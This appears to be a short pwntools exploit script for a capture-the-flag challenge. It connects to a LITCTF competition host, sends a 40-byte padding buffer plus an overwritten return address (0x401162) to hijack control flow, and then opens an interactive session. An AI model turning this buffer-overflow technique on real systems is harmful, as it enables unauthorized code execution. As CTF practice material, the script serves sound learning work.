from pwn import *

p = remote("litctf.live", 31788)

#0x401162
pad = 40 * b'\x50' + b'\x62\x11\x40\x00\x00\x00\x00\x00'
p.sendline(pad)

p.interactive()
